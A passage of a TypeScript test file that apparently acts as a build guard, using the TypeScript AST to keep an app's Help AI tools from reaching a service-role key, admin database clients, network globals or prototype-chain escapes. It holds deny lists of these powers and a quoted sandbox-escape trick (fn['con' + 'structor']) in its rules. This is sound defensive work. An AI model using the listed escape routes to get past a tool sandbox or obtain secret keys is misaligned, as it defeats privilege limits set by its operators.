/**
 * R-2774 / H-01 (14 Nov 2026) — Help AI tools can NEVER reach the service role.
 *
 * Help AI is getting full power for the owner (G-HELPAI). Its tools must run with the signed-in
 * person's own login (RLS) only. This guard reads every file with the TypeScript parser (an AST,
 * so no string, comment or regex literal can hide code — rev2) and fails the build when:
 *
 *   1. any file under src/lib/ai/help-tools (or the legacy help-data-tools.ts), or ANY file they
 *      import (followed transitively through src/), names createAdminClient /
 *      createAdminClientFor / SUPABASE_SERVICE_ROLE_KEY / service_role, or imports a module that
 *      builds a client from a key or reaches the DB with a user / tenant of its choosing
 *      (@/lib/supabase/bare, @supabase/supabase-js or @supabase/ssr as values,
 *      @/server/postgrest/*, @/server/db, @supabase/postgrest-js, @prisma/*, pg, module /
 *      node:module), or has an import()/require() whose argument is not a string literal, or a
 *      local (`@/` or relative) import that does not resolve to a file the walk follows (fail
 *      closed — .js / .mjs too);
 *   2. @/lib/supabase/server is imported anywhere in that graph except help-tools/session.ts —
 *      and there only `createClient` (the cookie client);
 *   3. a help-tools file uses an ambient power: process (registry.ts may read
 *      process.env.HELP_AI_V2 only), fetch, require, createRequire, eval, Function, globalThis,
 *      global, window — or imports an npm package outside HELP_NPM_ALLOWED;
 *   4. a help-tools file other than reader.ts touches tables (`.from(…)`), or any of them calls
 *      `.rpc(`, `.storage` or `.auth` (dot or ["…"] form);
 *   5. scopedReader / sessionClient / runOneTool are called from anywhere but runner.ts and the legacy
 *      help-data-tools.ts (so no one wraps another client into a tool's reader);
 *   6. the readable-table allowlist names a credential table or a table holding a SECRET_COLUMNS
 *      entry (the list is shared with secret-columns.test.ts).
 *
 * R-2879 / H-01b (17 Nov 2026) — allowlists instead of the name denylist (rules 3 and 5 above stay as a second lock):
 *   7. a help-tools file names only what it declares or imports plus the globals on HELP_GLOBALS,
 *      each in its listed form (scope resolved by the TypeScript checker); no `constructor` /
 *      `__proto__` / `prototype` in any spelling, no computed member read outside
 *      COMPUTED_ACCESS_ALLOWED, no `this` outside a class member, no import.meta, no `declare`;
 *   8. every file the help tools reach is on HELP_GRAPH_ALLOWED (the whole graph, by name); a
 *      baseUrl-style `src/…` import is local; reached files import only FOLLOWED_NPM_ALLOWED and
 *      hold no ambient power (process in any form, fetch, sockets, .constructor). NOT closed there:
 *      a computed member read (`fn["con" + "structor"]`) — those files index maps and arrays by
 *      computed keys all the time (nav.ts), so the control for them is the named, reviewed list;
 *   9. restricted exports (scopedReader, sessionClient, runOneTool, runHelpTools, defineHelpTool,
 *      buildRegistry, HELP_TOOL_REGISTRY, openHelpSession, the rate counter …) are checked by the
 *      MODULE imported — alias, namespace, re-export and import() forms included; they may only
 *      be called, never stored or passed on; runHelpTools takes a custom registry (4th argument)
 *      only inside help-tools tests; the route opens ONE session per question.
 *
 * R-2882 / H-01c (17 Nov 2026) — the review of R-2879 left two guard holes, closed here:
 *  10. a computed member read (`obj[expr]`) passes only by DECLARATION, resolved by the TypeScript
 *      checker, not by file + text: the key is a const loop variable over a fixed frozen list of names,
 *      or an array callback's index, or the object is a plain data map (a literal, Object.create(null),
 *      a local builder that returns one); outside help-tools an explicit per-site entry may add one;
 *  11. files the help tools reach may not reflect on the prototype chain (getOwnPropertyDescriptor(s),
 *      getPrototypeOf, setPrototypeOf, defineProperty …) or hold the strings constructor / __proto__ /
 *      prototype; a help file other than types.ts may not touch a zod schema's _def / _cached /
 *      unknownKeys (the tool's `input` is a private parser — see types.ts).
 *
 * Runtime locks are tested in src/lib/ai/help-tools/runner.test.ts (forged session refused,
 * service-role key refused, reader refuses secret columns, query has no write methods).
 */
import { describe, it, expect } from "vitest";
import fs from "node:fs";
import path from "node:path";
import ts from "typescript";
import { readSource } from "@/lib/testing/source-cache";
import { FORBIDDEN_MEMBERS, REFLECT_MEMBERS, FOLLOWED_FORBIDDEN_STRINGS, SCHEMA_INTERNALS, FOLLOWED_COMPUTED_SITES, symbolsFor, computedReadProblem, type Syms } from "@/lib/testing/help-guard-computed";
import { listSourceFiles } from "@/lib/testing/walk-source";
import { SECRET_COLUMNS } from "./secret-columns";
import { HELP_READ_TABLES, HELP_NEVER_TABLES } from "@/lib/ai/help-tools/reader";

const ROOT = path.resolve(__dirname, "../../..");
const SRC = path.join(ROOT, "src");
const HELP_DIR = "src/lib/ai/help-tools";
const LEGACY = "src/lib/ai/help-data-tools.ts";
const SESSION = `${HELP_DIR}/session.ts`;
const REGISTRY = `${HELP_DIR}/registry.ts`;
const SERVER = "src/lib/supabase/server.ts";
const TYPES_FILE = `${HELP_DIR}/types.ts`;

const rel = (abs: string) => path.relative(ROOT, abs).split(path.sep).join("/");
const isTest = (f: string) => /\.(test|spec)\.[cm]?[jt]sx?$/.test(f);
const isHelpFile = (f: string) => f === LEGACY || f.startsWith(`${HELP_DIR}/`);

function helpFiles(): string[] {
  const dir = path.join(ROOT, HELP_DIR);
  return fs.readdirSync(dir).filter((f) => /\.tsx?$/.test(f) && !isTest(f)).map((f) => `${HELP_DIR}/${f}`);
}

const SERVICE_ROLE = /\bcreateAdminClient(For)?\b|SUPABASE_SERVICE_ROLE_KEY|\bservice_role\b/;
/**
 * Modules that build a client from a key, or reach the database with a user / tenant of the
 * caller's choosing (withTenant in @/server/db, a bare postgrest / Prisma / pg client — review M2),
 * or load code by a computed name (module / node:module — createRequire).
 */
const KEY_CLIENT_MODULES = [
  /^@\/lib\/supabase\/bare$/, /^@\/server\/postgrest\//, /^@supabase\/ssr$/,
  /^@\/server\/db(\/|$)/, /^@supabase\/postgrest-js$/, /^@prisma\//, /^pg$/, /^(node:)?module$/,
];
const SUPABASE_JS = /^@supabase\/supabase-js$/;
/** npm packages a help-tools file may import as values (what they use today). */
const HELP_NPM_ALLOWED = ["zod"];
/** Ambient powers no help-tools file may name (rev2 #3). */
const AMBIENT = new Set(["process", "fetch", "require", "createRequire", "eval", "Function", "globalThis", "global", "window"]);
/** Table / RPC / storage / auth members of a Supabase client. */
const CLIENT_MEMBERS = new Set(["from", "rpc", "storage", "auth"]);

interface Imp { spec: string; names: string[]; typeOnly: boolean }

/* ───────────── R-2879 / H-01b: allowlists (a new entry = a reviewed change to this file) ───────────── */

/**
 * Every file OUTSIDE help-tools that the help tools may reach through imports (finding 2). The
 * list is the whole graph, not only the first hop: a help tool importing a new helper, or a listed
 * helper importing a new file, fails here until that file is read and added. Only pure helpers
 * belong on it — no network, mail, payments, DB client, env secrets or side effects at import.
 */
const HELP_GRAPH_ALLOWED: readonly string[] = [
  "src/lib/utils.ts", "src/lib/ops/fetch-all.ts", "src/lib/ops/p-limit.ts", "src/lib/dates/ist.ts",
  "src/lib/company/summary.ts", "src/lib/subscriptions/folders.ts", "src/lib/subscriptions/mrr-of.ts",
  "src/lib/invoices/overdue.ts", "src/lib/invoices/kpis.ts", "src/lib/invoices/payment-state.ts",
  "src/lib/navigation/drilldown.ts", "src/lib/auth/roles.ts", "src/lib/nav.ts",
  "src/lib/security/secret-columns.ts", "src/lib/accounting/sale-documents.ts",
  "src/lib/leads/capture-channel.ts", "src/lib/payments/cash-received.ts", "src/lib/payments/amount-due.ts",
  "src/lib/payments/receivables.ts", "src/lib/phone.ts", "src/lib/gst/countries.ts",
];
/** npm packages the files on HELP_GRAPH_ALLOWED may import as values (pure formatters only). */
const FOLLOWED_NPM_ALLOWED = ["clsx", "tailwind-merge", "zod"];
/** Names no file in the graph may use as a free identifier (help files have the stricter allowlist below). */
const FOLLOWED_AMBIENT = new Set([
  "process", "fetch", "require", "createRequire", "eval", "Function", "globalThis", "global", "window", "self",
  "WebSocket", "XMLHttpRequest", "WebAssembly", "Worker", "SharedWorker", "EventSource", "BroadcastChannel",
  "navigator", "document", "Reflect", "Proxy", "Deno", "Bun", "importScripts",
]);

/** How a help file may use one global: `G.member`, `G(...)`, `new G(...)`, `extends G`, or bare. */
interface GlobalUse { members?: readonly string[]; call?: true; new?: true; ext?: true; bare?: true }
/**
 * The ONLY globals a help-tools file may name (finding 1) — an allowlist, so a power nobody thought
 * of (self, WebSocket, Reflect, a new runtime global) is refused by default. A global may not be
 * copied into a variable (`const O = Object`) and only the listed members may be read off it.
 */
const HELP_GLOBALS = new Map<string, GlobalUse>(Object.entries({
  undefined: { bare: true }, NaN: { bare: true }, Infinity: { bare: true },
  Object: { members: ["create", "freeze", "fromEntries", "keys", "entries", "values", "isFrozen"] },
  Array: { members: ["isArray", "from"] },
  Number: { members: ["isInteger", "isSafeInteger", "isFinite"], call: true },
  Math: { members: ["min", "max", "floor", "ceil", "round", "abs"] },
  JSON: { members: ["parse", "stringify"] },
  Promise: { members: ["all", "race", "resolve"], new: true },
  String: { call: true }, Boolean: { call: true, bare: true },
  Error: { new: true, ext: true },
  Date: { new: true, members: ["now"] },
  Map: { new: true }, Set: { new: true }, WeakMap: { new: true }, WeakSet: { new: true },
  AbortController: { new: true },
  Buffer: { members: ["from"] },
  console: { members: ["error"] },
  crypto: { members: ["randomUUID"] },
  setTimeout: { call: true }, clearTimeout: { call: true },
} satisfies Record<string, GlobalUse>));
/**
 * Restricted exports of help-tools modules, checked by MODULE (finding 3): who may import each
 * name as a value, whatever local name they give it. Anything not listed is free inside
 * help-tools; from OUTSIDE help-tools only OUTSIDE_ALLOWED names may be imported at all.
 */
const ROUTE = "src/app/api/ai/help/route.ts";
const IN_HELP_DIR = "any file under help-tools";
const RESTRICTED: Record<string, readonly string[]> = {
  [`${HELP_DIR}/reader.ts#scopedReader`]: [`${HELP_DIR}/runner.ts`],
  [`${HELP_DIR}/session.ts#sessionClient`]: [`${HELP_DIR}/runner.ts`],
  [`${HELP_DIR}/session.ts#assertNotServiceRole`]: [`${HELP_DIR}/runner.ts`],
  [`${HELP_DIR}/session.ts#takeHelpCalls`]: [`${HELP_DIR}/runner.ts`],
  [`${HELP_DIR}/session.ts#openHelpSession`]: [ROUTE],
  [`${HELP_DIR}/runner.ts#runOneTool`]: [LEGACY],
  [`${HELP_DIR}/runner.ts#runHelpTools`]: [LEGACY],
  [`${HELP_DIR}/registry.ts#buildRegistry`]: [],
  [`${HELP_DIR}/limits.ts#helpToolRateOk`]: [`${HELP_DIR}/runner.ts`, LEGACY],
  [`${HELP_DIR}/limits.ts#resetHelpToolRate`]: [],
  [`${HELP_DIR}/registry.ts#HELP_TOOL_REGISTRY`]: [`${HELP_DIR}/runner.ts`],
  [`${HELP_DIR}/types.ts#defineHelpTool`]: [IN_HELP_DIR],
};
/** Value names a file outside help-tools (and outside the legacy file) may import from a help-tools module. */
const OUTSIDE_ALLOWED: Record<string, readonly string[]> = {
  [`${HELP_DIR}/session.ts`]: ["openHelpSession"],
  [`${HELP_DIR}/registry.ts`]: ["helpAiV2Enabled"],
  /* R-2882: app-help.ts wraps WORKSPACE FACTS / trail / findings / outline with the same cleaner and
     markers as tool results — pure text functions, no data access. */
  [`${HELP_DIR}/untrusted.ts`]: ["wrapUntrusted", "newUntrustedId", "HELP_UNTRUSTED_RULE"],
};
/** Names that may only ever be CALLED where they are imported — never stored, passed on or re-exported. */
const CALL_ONLY = new Set(["scopedReader", "sessionClient", "assertNotServiceRole", "takeHelpCalls", "openHelpSession", "runOneTool", "runHelpTools", "buildRegistry", "defineHelpTool", "helpToolRateOk", "resetHelpToolRate"]);

const ROOT_ENTRIES = new Set(fs.readdirSync(ROOT));
/**
 * A spec that names a file of this repo: `@/…`, relative, absolute, or bare but resolving under
 * tsconfig's baseUrl "." (`src/lib/…` — finding 2: it used to be taken for an npm package).
 */
const isLocal = (spec: string) =>
  spec.startsWith("@/") || spec.startsWith(".") || spec.startsWith("/") || spec.startsWith("\\") || /^[a-z]+:/i.test(spec) && !spec.startsWith("node:")
  || ROOT_ENTRIES.has(spec.split("/")[0]);

/** A local import → the file it loads, or null when nothing on disk matches. */
function resolve(fromRel: string, spec: string): string | null {
  const base = spec.startsWith("@/") ? path.join(SRC, spec.slice(2))
    : spec.startsWith(".") ? path.resolve(path.dirname(path.join(ROOT, fromRel)), spec)
    : ROOT_ENTRIES.has(spec.split("/")[0]) ? path.join(ROOT, spec)
    : null;
  if (base == null || !base.startsWith(ROOT)) return null;
  for (const c of [base, `${base}.ts`, `${base}.tsx`, path.join(base, "index.ts"), path.join(base, "index.tsx")]) {
    if (fs.existsSync(c) && fs.statSync(c).isFile()) return rel(c);
  }
  return null;
}

const stringArg = (n: ts.Node | undefined): string | null =>
  n && (ts.isStringLiteral(n) || ts.isNoSubstitutionTemplateLiteral(n)) ? n.text : null;

/** Imported names (the original name for `a as b`; "*" for namespace / default / dynamic). */
function clauseNames(clause: ts.ImportClause | undefined): string[] {
  if (!clause) return ["*"];
  const out: string[] = [];
  if (clause.name) out.push("default");
  const nb = clause.namedBindings;
  if (nb && ts.isNamespaceImport(nb)) out.push("*");
  if (nb && ts.isNamedImports(nb)) for (const e of nb.elements) if (!e.isTypeOnly) out.push((e.propertyName ?? e.name).text);
  return out;
}

/** Is `node` the `x` in `process.env.HELP_AI_V2` read in registry.ts — the one allowed env read? */
function isAllowedEnvRead(f: string, node: ts.Identifier): boolean {
  if (f !== REGISTRY || node.text !== "process") return false;
  const env = node.parent;
  if (!ts.isPropertyAccessExpression(env) || env.expression !== node || env.name.text !== "env") return false;
  const key = env.parent;
  return ts.isPropertyAccessExpression(key) && key.expression === env && key.name.text === "HELP_AI_V2";
}

/** A member name of `x.name` or `x["name"]`, else null. */
function memberName(n: ts.Node): string | null {
  if (ts.isPropertyAccessExpression(n)) return n.name.text;
  if (ts.isElementAccessExpression(n)) return stringArg(n.argumentExpression);
  return null;
}

interface FileScan { imports: Imp[]; problems: string[] }

/** Parse one file and check it; `src` is the file's text. */
function scanFile(f: string, src: string, used?: Set<string>): FileScan {
  const sf = ts.createSourceFile(f, src, ts.ScriptTarget.Latest, true, /\.[cm]?jsx?$/.test(f) ? ts.ScriptKind.JS : f.endsWith(".tsx") ? ts.ScriptKind.TSX : ts.ScriptKind.TS);
  const help = isHelpFile(f);
  const imports: Imp[] = [];
  const problems: string[] = [];
  const at = (n: ts.Node) => `${f}:${sf.getLineAndCharacterOfPosition(n.getStart(sf)).line + 1}`;
  let sy: Syms | undefined;

  const visit = (node: ts.Node): void => {
    // Imports and re-exports.
    if (ts.isImportDeclaration(node)) {
      const spec = stringArg(node.moduleSpecifier);
      if (spec != null) imports.push({ spec, names: clauseNames(node.importClause), typeOnly: !!node.importClause?.isTypeOnly });
    } else if (ts.isExportDeclaration(node) && node.moduleSpecifier) {
      const spec = stringArg(node.moduleSpecifier);
      if (spec != null) imports.push({ spec, names: ["*"], typeOnly: node.isTypeOnly });
    } else if (ts.isImportEqualsDeclaration(node) && ts.isExternalModuleReference(node.moduleReference)) {
      const spec = stringArg(node.moduleReference.expression);
      if (spec == null) problems.push(`${at(node)}: import = require() with a computed argument`);
      else imports.push({ spec, names: ["*"], typeOnly: node.isTypeOnly });
    } else if (ts.isCallExpression(node) && (node.expression.kind === ts.SyntaxKind.ImportKeyword || (ts.isIdentifier(node.expression) && node.expression.text === "require"))) {
      const spec = node.arguments.length === 1 ? stringArg(node.arguments[0]) : null;
      if (spec == null) problems.push(`${at(node)}: import()/require() whose argument is not a string literal (it cannot be checked)`);
      else imports.push({ spec, names: ["*"], typeOnly: false });
    }

    // Service-role words in names and strings (comments are not in the AST).
    if (ts.isIdentifier(node) || ts.isPrivateIdentifier(node) || ts.isStringLiteralLike(node) || ts.isTemplateHead(node) || ts.isTemplateMiddle(node) || ts.isTemplateTail(node)) {
      const text = node.text;
      // keyRole in session.ts compares the JWT claim with the string "service_role" — allowed there only.
      const allowed = f === SESSION && ts.isStringLiteral(node) && text === "service_role";
      if (!allowed && SERVICE_ROLE.test(text)) problems.push(`${at(node)}: names the service role / admin client (${text.slice(0, 40)})`);
    }

    if (!help) {
      /* R-2879 finding 2: files the help tools reach are pure helpers — no ambient power by any
         spelling (process["env"], fetch, sockets), no Function through .constructor, no import.meta. */
      if (ts.isIdentifier(node) && FOLLOWED_AMBIENT.has(node.text) && !isNameOnly(node)) problems.push(`${at(node)}: uses ${node.text} (a file help tools import may hold no ambient power)`);
      const fm = memberName(node);
      if (fm && FORBIDDEN_MEMBERS.has(fm) && fm !== "prototype") problems.push(`${at(node)}: .${fm} (reaches Function / the prototype chain)`);
      if (ts.isMetaProperty(node)) problems.push(`${at(node)}: import.meta`);
      /* R-2882 (finding 2): no reflection on the prototype chain, no string that names a way to Function,
         and a computed member read only where its declaration says what the key can be. */
      if (fm && REFLECT_MEMBERS.has(fm)) problems.push(`${at(node)}: .${fm} (reads or rewrites the prototype chain / property descriptors)`);
      if (ts.isStringLiteralLike(node) && FOLLOWED_FORBIDDEN_STRINGS.has(node.text)) problems.push(`${at(node)}: the string "${node.text}" (a name that reaches Function / the prototype chain)`);
      if (ts.isElementAccessExpression(node)) {
        sy ??= symbolsFor(sf);
        const why = computedReadProblem(f, sf, node, sy, false, used);
        if (why) problems.push(`${at(node)}: ${why}`);
      }
    }

    if (help) {
      // Ambient powers: any identifier use, except as a property name (x.fetch) or a declaration's member name.
      if (ts.isIdentifier(node) && AMBIENT.has(node.text) && !isAllowedEnvRead(f, node)) {
        const p = node.parent;
        const isMemberName = (ts.isPropertyAccessExpression(p) && p.name === node) || ((ts.isPropertyAssignment(p) || ts.isMethodDeclaration(p) || ts.isPropertySignature(p) || ts.isPropertyDeclaration(p)) && p.name === node);
        if (!isMemberName) problems.push(`${at(node)}: uses ${node.text} (no ambient powers in help tools)`);
      }
      // Supabase client members: .from( only in reader.ts; .rpc / .storage / .auth nowhere.
      const m = memberName(node);
      if (m && CLIENT_MEMBERS.has(m)) {
        const obj = (node as ts.PropertyAccessExpression | ts.ElementAccessExpression).expression;
        const isArrayFrom = m === "from" && ts.isIdentifier(obj) && ["Array", "Buffer", "Object"].includes(obj.text);
        if (m === "from" ? !isArrayFrom && !f.endsWith("/reader.ts") : true) problems.push(`${at(node)}: .${m} on a client (only reader.ts reads tables; no rpc / storage / auth)`);
      }
    }
    ts.forEachChild(node, visit);
  };
  visit(sf);
  if (help) problems.push(...helpFileProblems(f, sf));

  for (const imp of imports) {
    if (imp.typeOnly) continue;
    if (KEY_CLIENT_MODULES.some((r) => r.test(imp.spec))) problems.push(`${f}: imports ${imp.spec} (builds a client from a key / picks its own user)`);
    if (SUPABASE_JS.test(imp.spec)) problems.push(`${f}: value import from @supabase/supabase-js (only \`import type\` allowed)`);
    if (isLocal(imp.spec)) {
      const target = resolve(f, imp.spec);
      if (!target || !/\.tsx?$/.test(target)) problems.push(`${f}: local import ${imp.spec} does not resolve to a .ts file the guard follows (fail closed)`);
      else if (target === SERVER && (f !== SESSION || imp.names.join(",") !== "createClient")) problems.push(`${f}: imports @/lib/supabase/server (${imp.names.join(",")}) — only session.ts may, and only { createClient }`);
      // R-2879 finding 2: the first hop out of help-tools must be a named safe module.
      else if (help && target !== SERVER && !isHelpFile(target) && !HELP_GRAPH_ALLOWED.includes(target)) problems.push(`${f}: imports ${target}, which is not on HELP_GRAPH_ALLOWED (help tools import only named pure helpers — add it there with a review)`);
    } else if (help && !HELP_NPM_ALLOWED.includes(imp.spec)) {
      problems.push(`${f}: imports npm package ${imp.spec} (help tools may use only ${HELP_NPM_ALLOWED.join(", ")})`);
    } else if (!help && !FOLLOWED_NPM_ALLOWED.includes(imp.spec)) {
      // R-2879 finding 2: any npm package or node builtin in a followed file (postgres, node:http, child_process …).
      problems.push(`${f}: imports ${imp.spec} — a file help tools reach may import only ${FOLLOWED_NPM_ALLOWED.join(", ")}`);
    }
  }
  return { imports, problems };
}

/** Is this identifier only a NAME (x.name, { name: … }, a label, an import/export specifier), not a reference? */
function isNameOnly(id: ts.Identifier): boolean {
  const p = id.parent;
  if (ts.isPropertyAccessExpression(p)) return p.name === id;
  if (ts.isPropertyAssignment(p) || ts.isMethodDeclaration(p) || ts.isPropertyDeclaration(p) || ts.isPropertySignature(p) || ts.isMethodSignature(p)
    || ts.isGetAccessorDeclaration(p) || ts.isSetAccessorDeclaration(p) || ts.isEnumMember(p)) return p.name === id;
  if (ts.isBindingElement(p)) return p.propertyName === id;
  if (ts.isLabeledStatement(p) || ts.isBreakOrContinueStatement(p)) return true;
  if (ts.isImportSpecifier(p) || ts.isExportSpecifier(p) || ts.isNamespaceImport(p) || ts.isImportClause(p) || ts.isMetaProperty(p) || ts.isQualifiedName(p)) return true;
  return false;
}

/** May `this` be written here? Only straight inside a class member (arrows pass it through). */
function thisIsClassMember(n: ts.Node): boolean {
  for (let p = n.parent; p; p = p.parent) {
    if (ts.isArrowFunction(p)) continue;
    if (ts.isFunctionDeclaration(p) || ts.isFunctionExpression(p)) return false;
    if (ts.isConstructorDeclaration(p) || ts.isMethodDeclaration(p) || ts.isPropertyDeclaration(p) || ts.isGetAccessorDeclaration(p) || ts.isSetAccessorDeclaration(p)) return ts.isClassLike(p.parent);
    if (ts.isSourceFile(p)) return false;
  }
  return false;
}

/**
 * R-2879 finding 1 — a help-tools file names only what it declares itself, what it imports, and
 * the HELP_GLOBALS allowlist. Scope is resolved by the TypeScript checker (no lib, no module
 * resolution: a name is "local" only when its declaration is in this very file), so a variable
 * called `self` in one function does not excuse the global `self` in another.
 */
function helpFileProblems(f: string, sf: ts.SourceFile): string[] {
  const problems: string[] = [];
  const at = (n: ts.Node) => `${f}:${sf.getLineAndCharacterOfPosition(n.getStart(sf)).line + 1}`;
  const sy = symbolsFor(sf);
  const isLocalName = (id: ts.Identifier): boolean => sy.isLocalName(id);

  const globalUse = (id: ts.Identifier): void => {
    if (isAllowedEnvRead(f, id)) return;
    const use = HELP_GLOBALS.get(id.text);
    if (!use) { problems.push(`${at(id)}: names the global ${id.text} — not on HELP_GLOBALS (help tools use only listed globals)`); return; }
    const p = id.parent;
    let ok: boolean;
    let how: string;
    if (ts.isPropertyAccessExpression(p) && p.expression === id) { ok = !!use.members?.includes(p.name.text); how = `${id.text}.${p.name.text}`; }
    else if (ts.isNewExpression(p) && p.expression === id) { ok = !!use.new; how = `new ${id.text}`; }
    else if (ts.isCallExpression(p) && p.expression === id) { ok = !!use.call; how = `${id.text}()`; }
    else if (ts.isExpressionWithTypeArguments(p) && p.expression === id) { ok = !!use.ext; how = `extends ${id.text}`; }
    else { ok = !!use.bare; how = `${id.text} as a value`; }
    if (!ok) problems.push(`${at(id)}: ${how} — not an allowed use of this global (HELP_GLOBALS)`);
  };

  const walk = (n: ts.Node): void => {
    // `class X extends Error` — a value in a type-shaped node.
    if (ts.isExpressionWithTypeArguments(n)) {
      if (ts.isHeritageClause(n.parent) && n.parent.token === ts.SyntaxKind.ExtendsKeyword && ts.isClassLike(n.parent.parent)) walk(n.expression);
      return;
    }
    // Types are erased: nothing in them runs.
    if (ts.isTypeNode(n) || ts.isInterfaceDeclaration(n) || ts.isTypeAliasDeclaration(n) || ts.isTypeParameterDeclaration(n)) return;

    if (ts.isModuleDeclaration(n)) problems.push(`${at(n)}: namespace / declare global`);
    if (ts.canHaveModifiers(n) && ts.getModifiers(n)?.some((m) => m.kind === ts.SyntaxKind.DeclareKeyword)) problems.push(`${at(n)}: \`declare\` (it would make an ambient global look local)`);
    if (ts.isMetaProperty(n)) problems.push(`${at(n)}: import.meta`);
    if (n.kind === ts.SyntaxKind.ThisKeyword && !thisIsClassMember(n)) problems.push(`${at(n)}: \`this\` outside a class member (it can be the global object)`);
    if (ts.isParameter(n) && ts.isIdentifier(n.name) && n.name.text === "this") problems.push(`${at(n)}: a \`this\` parameter`);
    if (ts.isStringLiteralLike(n) && FORBIDDEN_MEMBERS.has(n.text)) problems.push(`${at(n)}: the string "${n.text}" (a member that reaches Function / the prototype chain)`);
    if (ts.isStringLiteralLike(n) && (REFLECT_MEMBERS.has(n.text) || (SCHEMA_INTERNALS.has(n.text) && f !== TYPES_FILE))) problems.push(`${at(n)}: the string "${n.text}" (reflection / zod internals)`);
    if (ts.isComputedPropertyName(n) && (ts.isBindingElement(n.parent) || !(ts.isStringLiteralLike(n.expression) || ts.isNumericLiteral(n.expression)))) problems.push(`${at(n)}: a computed property name`);
    if (ts.isElementAccessExpression(n)) {
      const why = computedReadProblem(f, sf, n, sy, true);
      if (why) problems.push(`${at(n)}: ${why}`);
    }
    if (ts.isCallExpression(n) && ts.isIdentifier(n.expression) && n.expression.text === "setTimeout" && !isLocalName(n.expression)) {
      const fn = n.arguments[0];
      if (!fn || !(ts.isArrowFunction(fn) || ts.isFunctionExpression(fn))) problems.push(`${at(n)}: setTimeout must be given a function written in place`);
    }
    if (ts.isIdentifier(n)) {
      if (FORBIDDEN_MEMBERS.has(n.text)) problems.push(`${at(n)}: .${n.text} (reaches Function / the prototype chain)`);
      else if (REFLECT_MEMBERS.has(n.text) || (SCHEMA_INTERNALS.has(n.text) && f !== TYPES_FILE)) problems.push(`${at(n)}: ${n.text} (reflection / zod internals — only types.ts may read a schema's _def)`);
      else if (!isNameOnly(n) && !isLocalName(n)) globalUse(n);
    }
    ts.forEachChild(n, walk);
  };
  walk(sf);
  return problems;
}

/** Imports with their local names: { name: exported name, local: the name used in this file }. */
interface Bind { spec: string; name: string; local: string; typeOnly: boolean; node: ts.Node }

/**
 * R-2879 finding 3 — one file against the restricted-export rule. Resolves each import to the
 * help-tools module it loads, so `import { scopedReader as mk }`, `import * as r`, `export … from`
 * and `import()` are judged by what they import, not by the name written at the call.
 */
function restrictedProblems(f: string, src: string): string[] {
  const sf = ts.createSourceFile(f, src, ts.ScriptTarget.Latest, true, f.endsWith(".tsx") ? ts.ScriptKind.TSX : ts.ScriptKind.TS);
  const problems: string[] = [];
  const at = (n: ts.Node) => `${f}:${sf.getLineAndCharacterOfPosition(n.getStart(sf)).line + 1}`;
  const inHelpDir = f.startsWith(`${HELP_DIR}/`);
  const binds: Bind[] = [];
  const helpTarget = (spec: string): string | null => {
    if (!isLocal(spec)) return null;
    const t = resolve(f, spec);
    return t && t.startsWith(`${HELP_DIR}/`) && !isTest(t) ? t : null;
  };

  const collect = (n: ts.Node): void => {
    if (ts.isImportDeclaration(n)) {
      const spec = stringArg(n.moduleSpecifier);
      const c = n.importClause;
      if (spec != null && helpTarget(spec)) {
        if (!c) binds.push({ spec, name: "*", local: "", typeOnly: false, node: n });
        else {
          if (c.name) binds.push({ spec, name: "default", local: c.name.text, typeOnly: c.isTypeOnly, node: n });
          const nb = c.namedBindings;
          if (nb && ts.isNamespaceImport(nb)) binds.push({ spec, name: "*", local: nb.name.text, typeOnly: c.isTypeOnly, node: n });
          if (nb && ts.isNamedImports(nb)) for (const e of nb.elements) binds.push({ spec, name: (e.propertyName ?? e.name).text, local: e.name.text, typeOnly: c.isTypeOnly || e.isTypeOnly, node: e });
        }
      }
    } else if (ts.isExportDeclaration(n) && n.moduleSpecifier) {
      const spec = stringArg(n.moduleSpecifier);
      if (spec != null && helpTarget(spec)) {
        const ec = n.exportClause;
        if (ec && ts.isNamedExports(ec)) for (const e of ec.elements) binds.push({ spec, name: (e.propertyName ?? e.name).text, local: "", typeOnly: n.isTypeOnly || e.isTypeOnly, node: e });
        else binds.push({ spec, name: "*", local: "", typeOnly: n.isTypeOnly, node: n });
      }
    } else if (ts.isCallExpression(n) && (n.expression.kind === ts.SyntaxKind.ImportKeyword || (ts.isIdentifier(n.expression) && n.expression.text === "require"))) {
      const spec = n.arguments.length === 1 ? stringArg(n.arguments[0]) : null;
      if (spec != null && helpTarget(spec)) binds.push({ spec, name: "*", local: "", typeOnly: false, node: n });
    } else if (ts.isImportEqualsDeclaration(n) && ts.isExternalModuleReference(n.moduleReference)) {
      const spec = stringArg(n.moduleReference.expression);
      if (spec != null && helpTarget(spec)) binds.push({ spec, name: "*", local: n.name.text, typeOnly: n.isTypeOnly, node: n });
    }
    ts.forEachChild(n, collect);
  };
  collect(sf);

  const callOnly = new Map<string, string>(); // local name → exported name
  for (const b of binds) {
    if (b.typeOnly) continue;
    const target = helpTarget(b.spec)!;
    const what = `${target}#${b.name}`;
    const isReexport = ts.isExportSpecifier(b.node) || ts.isExportDeclaration(b.node);
    if (b.name === "*" || b.name === "default") {
      // A whole-module handle hides which export is used. Inside help-tools a plain `import "./x"` never happens; refuse all.
      problems.push(`${at(b.node)}: takes the whole module ${target} (namespace / export * / import()) — import the names you use`);
      continue;
    }
    if (!inHelpDir && f !== LEGACY && !(OUTSIDE_ALLOWED[target] ?? []).includes(b.name)) {
      problems.push(`${at(b.node)}: ${f} imports ${what} — outside help-tools only ${Object.entries(OUTSIDE_ALLOWED).map(([m, ns]) => `${path.basename(m)}: ${ns.join(", ")}`).join("; ")} may be imported`);
      continue;
    }
    const allowed = RESTRICTED[what];
    if (allowed && !allowed.includes(f) && !(inHelpDir && allowed.includes(IN_HELP_DIR))) { problems.push(`${at(b.node)}: ${f} imports ${what} — only ${allowed.join(", ") || "its own module"} may`); continue; }
    if (CALL_ONLY.has(b.name)) {
      if (isReexport) problems.push(`${at(b.node)}: re-exports ${what}`);
      else callOnly.set(b.local, b.name);
    }
  }

  if (callOnly.size) {
    const uses = (n: ts.Node): void => {
      if (ts.isTypeNode(n) || ts.isImportDeclaration(n)) return;
      if (ts.isExportSpecifier(n) && callOnly.has((n.propertyName ?? n.name).text)) problems.push(`${at(n)}: re-exports ${callOnly.get((n.propertyName ?? n.name).text)}`);
      if (ts.isIdentifier(n) && callOnly.has(n.text) && !isNameOnly(n)) {
        const name = callOnly.get(n.text)!;
        const p = n.parent;
        const isCallee = ts.isCallExpression(p) && p.expression === n;
        if (!isCallee) problems.push(`${at(n)}: ${name} is stored / passed on / exported — it may only be called`);
        else if (name === "runHelpTools" && !inHelpDir && (p.arguments.length > 3 || p.arguments.some((a) => ts.isSpreadElement(a)))) {
          problems.push(`${at(n)}: runHelpTools with a custom registry (4th argument) — only help-tools tests may`);
        }
      }
      ts.forEachChild(n, uses);
    };
